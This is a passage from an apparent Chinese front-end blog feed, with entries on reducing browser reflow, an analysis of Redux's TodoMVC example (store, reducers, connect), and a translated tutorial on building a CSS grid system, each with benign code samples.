<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> frag = <span class="built_in">document</span>.createDocumentFragment();</div><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> x = <span class="number">0</span>; x &lt; <span class="number">10</span>; x++) &#123;</div><div class="line">    <span class="keyword">var</span> li = <span class="built_in">document</span>.createElement(<span class="string">"li"</span>);</div><div class="line">    li.innerHTML = <span class="string">"List item "</span> + x;</div><div class="line">    frag.appendChild(li);</div><div class="line">&#125;</div><div class="line">listNode.appendChild(frag);</div></pre></td></tr></table></figure>
<h3 id="对于动画元素，每一帧都会触发回流，使其脱离文档流，或使用requestAnimationFrame"><a href="#对于动画元素，每一帧都会触发回流，使其脱离文档流，或使用requestAnimationFrame" class="headerlink" title="对于动画元素，每一帧都会触发回流，使其脱离文档流，或使用requestAnimationFrame"></a>对于动画元素，每一帧都会触发回流，使其脱离文档流，或使用<code>requestAnimationFrame</code></h3><p>position: absolute / fixed 或 float</p>
<p>对于<code>requestAnimationFrame</code>而言，它会将每一帧中的所有DOM操作集中在一起，在一次重绘或回流中完成。而对于隐藏或不可见的元素，则不会进行重绘与回流。</p>
<h3 id="减少不必要的DOM深度，精简CSS，CSS避免复杂匹配与末尾通配符"><a href="#减少不必要的DOM深度，精简CSS，CSS避免复杂匹配与末尾通配符" class="headerlink" title="减少不必要的DOM深度，精简CSS，CSS避免复杂匹配与末尾通配符"></a>减少不必要的DOM深度，精简CSS，CSS避免复杂匹配与末尾通配符</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在探讨浏览器的重绘与回流问题之前，让我们来梳理一下，当浏览器接收的服务器的响应，得到HTML之后，发生了些什么:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTML被交给HTML解析器转化为一系列的Token&lt;/li&gt;
&lt;li&gt;根据Token构建Node，形成DOM Tree&lt;/li&gt;
&lt;li&gt;遇到CSS标签或者JS脚本标签就会启用新线程请求下载&lt;/li&gt;
&lt;li&gt;CSS样式被CSS解析器解释成内部表示结构&lt;/li&gt;
&lt;li&gt;CSS解析器工作完成后，将样式信息附合到DOM树上，形成Render Tree&lt;/li&gt;
&lt;li&gt;对Render Tree的各个节点计算布局信息，包括位置、尺寸等等&lt;/li&gt;
&lt;li&gt;根据Render Tree利用浏览器的UI渲染线程渲染页面&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="前端基本功" scheme="http://blackganglion.com/categories/%E5%89%8D%E7%AB%AF%E5%9F%BA%E6%9C%AC%E5%8A%9F/"/>
    
    
      <category term="浏览器" scheme="http://blackganglion.com/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>透过TodoMVC看Redux</title>
    <link href="http://blackganglion.com/2016/03/31/%E9%80%8F%E8%BF%87TodoMVC%E7%9C%8BRedux/"/>
    <id>http://blackganglion.com/2016/03/31/透过TodoMVC看Redux/</id>
    <published>2016-03-30T16:58:00.000Z</published>
    <updated>2016-07-08T11:42:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天再次review了Redux文档中TodoMVC的示例，通过这个示例，我认为能较好得反应出Redux的完整思想。这里做些简要分析，同时对于最基本的Redux做些总结吧。</p>
<h2 id="store、state、reducer与action"><a href="#store、state、reducer与action" class="headerlink" title="store、state、reducer与action"></a>store、state、reducer与action</h2><p><img src="/images/17-3.png" alt="pic-1"></p>
<a id="more"></a>
<p><code>store</code>是Redux的核心，与Flux不同的是，<code>store</code>在Redux中是唯一的，可谓是中枢系统。</p>
<p>在todoMVC中，我们首先来创建<code>store</code>，这里尽可能简化代码，只为说明核心问题:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">'redux'</span></div><div class="line"><span class="keyword">import</span> rootReducer <span class="keyword">from</span> <span class="string">'../reducers'</span></div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">configureStore</span>(<span class="params">initialState</span>) </span>&#123;</div><div class="line">  <span class="keyword">const</span> store = createStore(rootReducer, initialState)</div><div class="line">  <span class="keyword">return</span> store</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>createStore</code>是redux的API，其中第一个参数为reducer，其主要接受两个参数，分别是当前的state与相应action，返回新的state。那让我们来看一下rootReducer:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> &#123; combineReducers &#125; <span class="keyword">from</span> <span class="string">'redux'</span></div><div class="line"><span class="keyword">import</span> todos <span class="keyword">from</span> <span class="string">'./todos'</span></div><div class="line"></div><div class="line"><span class="keyword">const</span> rootReducer = combineReducers(&#123;</div><div class="line">  todos</div><div class="line">&#125;)</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> rootReducer</div></pre></td></tr></table></figure>
<p>这里使用了一个辅助函数<code>combineReducers</code>，主要应用于各个reducer的合并。因为当应用复杂之后，需要拆分reducer，分别负责不同的state管理。似乎这里并不能说明问题，只有一个reducer: todos:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> initialState = [</div><div class="line">  &#123;</div><div class="line">    text: <span class="string">'Use Redux'</span>,</div><div class="line">    completed: <span class="literal">false</span>,</div><div class="line">    id: <span class="number">0</span></div><div class="line">  &#125;</div><div class="line">]</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">todos</span>(<span class="params">state = initialState, action</span>) </span>&#123;</div><div class="line">   <span class="keyword">switch</span> (action.type) &#123;</div><div class="line">    <span class="keyword">case</span> ADD_TODO:</div><div class="line">      <span class="keyword">return</span> [</div><div class="line">        &#123;</div><div class="line">          id: state.reduce((maxId, todo) =&gt; <span class="built_in">Math</span>.max(todo.id, maxId), <span class="number">-1</span>) + <span class="number">1</span>,</div><div class="line">          completed: <span class="literal">false</span>,</div><div class="line">          text: action.text</div><div class="line">        &#125;, </div><div class="line">        ...state</div><div class="line">      ]</div><div class="line"></div><div class="line">    <span class="keyword">case</span> DELETE_TODO:</div><div class="line"></div><div class="line">    <span class="keyword">case</span> EDIT_TODO:</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">   default:</div><div class="line">     <span class="keyword">return</span> state</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>对于reducer而言，传入的是previousState与action，返回新的newState。</p>
<p>这里是使用了较多ES6的，当传入的state为undefined时，即首次执行时，传入state为默认初始state。当action为ADD_TODO，返回新的一条todo + 传入state，使用了扩展运算符(…)。</p>
<p>到这里为止，TodoMVC示例的Redux核心思想部分已经梳理完了，这部分其实并不是很多，关键在于理解吧。当然这还远远没有结束，Redux实则为一种库，可以与Backbone、Angular等多种前端框架相配合，毫无疑问它与React的契合度更高。React把处理state中数据的问题留给了我们，Redux就是为了帮我们解决这个问题。</p>
<h2 id="React与Redux"><a href="#React与Redux" class="headerlink" title="React与Redux"></a>React与Redux</h2><p>在React-Redux中，分为容器组件(最顶层)和展示组件(中间和子组件)，容器组件使用Redux，而展示组件则是普通的React，利用props。</p>
<p>那么实际中，我们是如何来连接React与Redux store的呢？让我们来看一下TodoMVC的顶层结构:</p>
<p>index.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span></div><div class="line"><span class="keyword">import</span> &#123; render &#125; <span class="keyword">from</span> <span class="string">'react-dom'</span></div><div class="line"><span class="keyword">import</span> &#123; Provider &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></div><div class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./containers/App'</span></div><div class="line"><span class="keyword">import</span> configureStore <span class="keyword">from</span> <span class="string">'./store/configureStore'</span></div><div class="line"></div><div class="line"><span class="keyword">const</span> store = configureStore()</div><div class="line"></div><div class="line">render(</div><div class="line">  <span class="xml"><span class="tag">&lt;<span class="name">Provider</span> <span class="attr">store</span>=<span class="string">&#123;store&#125;</span>&gt;</span></span></div><div class="line">    <span class="tag">&lt;<span class="name">App</span> /&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">Provider</span>&gt;</span>,</div><div class="line">  <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>)</div><div class="line">)</div></pre></td></tr></table></figure>
<p>containers/App.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component, PropTypes &#125; <span class="keyword">from</span> <span class="string">'react'</span></div><div class="line"><span class="keyword">import</span> &#123; bindActionCreators &#125; <span class="keyword">from</span> <span class="string">'redux'</span></div><div class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></div><div class="line"><span class="keyword">import</span> Header <span class="keyword">from</span> <span class="string">'../components/Header'</span></div><div class="line"><span class="keyword">import</span> MainSection <span class="keyword">from</span> <span class="string">'../components/MainSection'</span></div><div class="line"><span class="keyword">import</span> * <span class="keyword">as</span> TodoActions <span class="keyword">from</span> <span class="string">'../actions'</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">  render() &#123;</div><div class="line">    <span class="keyword">const</span> &#123; todos, actions &#125; = <span class="keyword">this</span>.props</div><div class="line">     <span class="keyword">return</span> (</div><div class="line">      &lt;div&gt;</div><div class="line">        &lt;Header addTodo=&#123;actions.addTodo&#125; /&gt;</div><div class="line">        &lt;MainSection todos=&#123;todos&#125; actions=&#123;actions&#125; /&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function mapStateToProps(state) &#123;</div><div class="line">  return &#123;</div><div class="line">    todos: state.todos</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function mapDispatchToProps(dispatch) &#123;</div><div class="line">  return &#123;</div><div class="line">    actions: bindActionCreators(TodoActions, dispatch)</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">export default connect(</div><div class="line">  mapStateToProps,</div><div class="line">  mapDispatchToProps</div><div class="line">)(App)</div></pre></td></tr></table></figure>
<p>连接主要通过<code>connect</code>方法来实现，在App类中，我们发现this.props中含有todos与actions，这两者正来自于connect中注入的两个函数的返回值。</p>
<p><code>mapStateToProps(state)</code>将会监听Redux store的变化，一旦其发生改变，mapStateToprops将会被调用，新的state.todos将用于赋值，返回对象与App的this.props合并。</p>
<p><code>mapDispatchToProps(dispatch)</code>这里使用了一个辅助函数<code>bindActionCreators(actionCreators, dispatch)</code>，这样处理的目的在于将dispatch与actionCreators绑定在一起后作为actions传入props。比如当调用actions.addTodo时，便会自行触发dispatch(action)，完成Redux的一系列流程。</p>
<p>这里的主要目的就在于，将Redux store中的state与dispatch进行分离，分别传入props。当然我们还需要在根组件上注入Redux store，store创建完成后，采用<code>&lt;Provider store={store}&gt;&lt;/Provider&gt;</code>将整个视图结构包装在内部。</p>
<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p><img src="/images/17-2.png" alt="blog-17-pic-2"></p>
<p>关于整个TodoMVC的具体实现，大家可以参考上面的组件结构图，或者直接看<a href="https://github.com/reactjs/redux/tree/master/examples/todomvc" target="_blank" rel="external">官方代码</a>，这里就不详细展开了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天再次review了Redux文档中TodoMVC的示例，通过这个示例，我认为能较好得反应出Redux的完整思想。这里做些简要分析，同时对于最基本的Redux做些总结吧。&lt;/p&gt;
&lt;h2 id=&quot;store、state、reducer与action&quot;&gt;&lt;a href=&quot;#store、state、reducer与action&quot; class=&quot;headerlink&quot; title=&quot;store、state、reducer与action&quot;&gt;&lt;/a&gt;store、state、reducer与action&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/17-3.png&quot; alt=&quot;pic-1&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="React全家桶" scheme="http://blackganglion.com/categories/React%E5%85%A8%E5%AE%B6%E6%A1%B6/"/>
    
    
      <category term="Redux" scheme="http://blackganglion.com/tags/Redux/"/>
    
  </entry>
  
  <entry>
    <title>[译]构建自己的CSS栅格系统</title>
    <link href="http://blackganglion.com/2016/03/20/%E8%AF%91-%E6%9E%84%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84CSS%E6%A0%85%E6%A0%BC%E7%B3%BB%E7%BB%9F/"/>
    <id>http://blackganglion.com/2016/03/20/译-构建自己的CSS栅格系统/</id>
    <published>2016-03-19T17:57:00.000Z</published>
    <updated>2016-07-08T11:54:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>原文地址: <a href="http://j4n.co/blog/Creating-your-own-css-grid-system" target="_blank" rel="external">http://j4n.co/blog/Creating-your-own-css-grid-system</a></p>
<p>CSS栅格已经出现很长时间了，它们经常会被包含在一些框架中，就像Bootstrap。我并不厌恶Bootstarp，但当你需要栅格布局而且使用框架是得不偿失的。那么怎样才能构建我们自己的CSS栅格布局呢？</p>
<a id="more"></a>
<h2 id="CSS栅格布局的基本构成"><a href="#CSS栅格布局的基本构成" class="headerlink" title="CSS栅格布局的基本构成"></a>CSS栅格布局的基本构成</h2><p><img src="http://j4n.co/content/4-blog/10-Creating-your-own-css-grid-system/grid-elements.png" alt="http://j4n.co/content/4-blog/10-Creating-your-own-css-grid-system/grid-elements.png"></p>
<p>一个基本的栅格，包含以下几个部分:</p>
<ul>
<li>a container(容器)</li>
<li>rows(行)</li>
<li>columns(列)</li>
<li>gutters(列与列中的间隙)</li>
</ul>
<h2 id="The-Container-容器"><a href="#The-Container-容器" class="headerlink" title="The Container(容器)"></a>The Container(容器)</h2><p><img src="http://j4n.co/content/4-blog/10-Creating-your-own-css-grid-system/container.png" alt="http://j4n.co/content/4-blog/10-Creating-your-own-css-grid-system/container.png"></p>
<p>容器的目的在于控制内部栅格的总宽度。一般来说，容器的宽度为100%，但为了大屏显示，你可能需要设置一个最大宽度。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.grid-container</span> &#123;</div><div class="line">    <span class="attribute">width </span>: <span class="number">100%</span>;</div><div class="line">    <span class="attribute">max-width </span>: <span class="number">1200px</span>; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="The-Row-行"><a href="#The-Row-行" class="headerlink" title="The Row(行)"></a>The Row(行)</h2><p><img src="http://j4n.co/content/4-blog/10-Creating-your-own-css-grid-system/row.png" alt="http://j4n.co/content/4-blog/10-Creating-your-own-css-grid-system/row.png"></p>
<p>行的目的在于保证列不向别的行溢出，我们使用浮动清除去保证任何在行内的元素仍在行内。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*-- 浮动清除 -- */</span> </div><div class="line"><span class="selector-class">.row</span><span class="selector-pseudo">:before</span>, </div><div class="line"><span class="selector-class">.row</span><span class="selector-pseudo">:after</span> &#123;</div><div class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</div><div class="line">    <span class="attribute">display</span>: table ;</div><div class="line">    <span class="attribute">clear</span>: both;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="The-Column-列"><a href="#The-Column-列" class="headerlink" title="The Column(列)"></a>The Column(列)</h2><p><img src="http://j4n.co/content/4-blog/10-Creating-your-own-css-grid-system/column.png" alt="http://j4n.co/content/4-blog/10-Creating-your-own-css-grid-system/column.png"></p>
<p>列是栅格系统中比较复杂的一部分。首先，在CSS中有各种各样的方法去定位列，由于响应式设计等因素，也有多种宽度需要去考虑。在本文中，我们将会定位列并给予它们宽度，我将暂时不考虑响应式。</p>
<h2 id="Column-Positioning-列定位"><a href="#Column-Positioning-列定位" class="headerlink" title="Column Positioning(列定位)"></a>Column Positioning(列定位)</h2><p><code>Floats</code>, <code>inline-blocks</code>, <code>display-table</code>, <code>display-flex</code>. 各种不同的方法在CSS中定位列。就我的经验来看，最少错误的可能与最广泛的使用就是<code>float</code>方法了。如果我们的列是空的，浮动的列将会相互堆叠 。为了避免，我们为列设置了最小宽度。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-attr">[class*='col-']</span> &#123;</div><div class="line">    <span class="attribute">float</span>: left;</div><div class="line">    <span class="attribute">min-height</span>: <span class="number">1px</span>; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Column-Widths-列宽度"><a href="#Column-Widths-列宽度" class="headerlink" title="Column Widths(列宽度)"></a>Column Widths(列宽度)</h2><p>为了求得一个列的宽度，我们必须根据容器的宽度去划分列。在我的例子中，容器的宽度是100%，我们需要6列，100/6=16.6，所以我们列的宽度是16.66%。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-attr">[class*='col-']</span> &#123;</div><div class="line">    <span class="attribute">float</span>: left;</div><div class="line">    <span class="attribute">min-height</span>: <span class="number">1px</span>; </div><div class="line">    <span class="attribute">width</span>: <span class="number">16.66%</span>; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当然，这仅仅是个开始。如果我们需要一个部分有2列宽，我们需要创建一列具有两列宽，计算是十分简单的。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.col-1</span>&#123;</div><div class="line">    <span class="attribute">width</span>: <span class="number">16.66%</span>; </div><div class="line">&#125;</div><div class="line"><span class="selector-class">.col-2</span>&#123;</div><div class="line">    <span class="attribute">width</span>: <span class="number">33.33%</span>; </div><div class="line">&#125;</div><div class="line"><span class="selector-class">.col-3</span>&#123;</div><div class="line">    <span class="attribute">width</span>: <span class="number">50%</span>; </div><div class="line">&#125;</div><div class="line"><span class="selector-class">.col-4</span>&#123;</div><div class="line">    <span class="attribute">width</span>: <span class="number">66.664%</span>;</div><div class="line">&#125;</div><div class="line"><span class="selector-class">.col-5</span>&#123;</div><div class="line">    <span class="attribute">width</span>: <span class="number">83.33%</span>;</div><div class="line">&#125;</div><div class="line"><span class="selector-class">.col-6</span>&#123;</div><div class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>唯一一件我们需要考虑的事情是当我们将不同的列混合组合时，它的宽度号加起来要等于6。</p>
<h2 id="Column-Gutters-列间空隙"><a href="#Column-Gutters-列间空隙" class="headerlink" title="Column Gutters(列间空隙)"></a>Column Gutters(列间空隙)</h2><p><img src="http://j4n.co/content/4-blog/10-Creating-your-own-css-grid-system/column-gutters.png" alt="http://j4n.co/content/4-blog/10-Creating-your-own-css-grid-system/column-gutters.png"></p>
<p>在<code>border-box</code>盒模型之前，一个百分比控制宽度的元素去设置静态的padding是十分痛苦的。幸运的是，使用<code>border-box</code>我们能够容易得创建空隙。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*-- 设置栅格布局中所有元素都是border-box --*/</span></div><div class="line"><span class="selector-class">.grid-container</span> *&#123;</div><div class="line">    <span class="attribute">box-sizing</span>: border-box; </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-attr">[class*='col-']</span> &#123;</div><div class="line">    <span class="attribute">float</span>: left;</div><div class="line">    <span class="attribute">min-height</span>: <span class="number">1px</span>; </div><div class="line">    <span class="attribute">width</span>: <span class="number">16.66%</span>; </div><div class="line">    <span class="comment">/*-- 空隙 --*/</span></div><div class="line">    <span class="attribute">padding</span>: <span class="number">12px</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>(个人角度讲，我使用* {box-sizing: border-box;}在我的CSS里，去允许页面中任何元素都是border-box)。</p>
<h2 id="栅格布局基本完成"><a href="#栅格布局基本完成" class="headerlink" title="栅格布局基本完成"></a>栅格布局基本完成</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"grid-container outline"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-2"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-2<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-2"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-2<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-2"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-2<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-3"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-3<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-3"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-3<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<p>完整的HTML与CSS如下:</p>
<h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"> * &#123;</div><div class="line">     <span class="attribute">box-sizing</span>: border-box;</div><div class="line"> &#125;</div><div class="line"></div><div class="line"><span class="selector-class">.grid-container</span>&#123;</div><div class="line">     <span class="attribute">width</span>: <span class="number">100%</span>; </div><div class="line">     <span class="attribute">max-width</span>: <span class="number">1200px</span>;</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> <span class="comment">/*-- 浮动清除 -- */</span> </div><div class="line"> <span class="selector-class">.row</span><span class="selector-pseudo">:before</span>, </div><div class="line"> <span class="selector-class">.row</span><span class="selector-pseudo">:after</span> &#123;</div><div class="line">     <span class="attribute">content</span>: <span class="string">""</span>;</div><div class="line">     <span class="attribute">display</span>: table;</div><div class="line">     <span class="attribute">clear</span>: both;</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> <span class="selector-attr">[class*='col-']</span> &#123;</div><div class="line">     <span class="attribute">float</span>: left; </div><div class="line">     <span class="attribute">min-height</span>: <span class="number">1px</span>; </div><div class="line">     <span class="attribute">width</span>: <span class="number">16.66%</span>; </div><div class="line">     <span class="comment">/*-- 空隙 -- */</span></div><div class="line">     <span class="attribute">padding</span>: <span class="number">12px</span>; </div><div class="line">     <span class="attribute">background-color</span>: <span 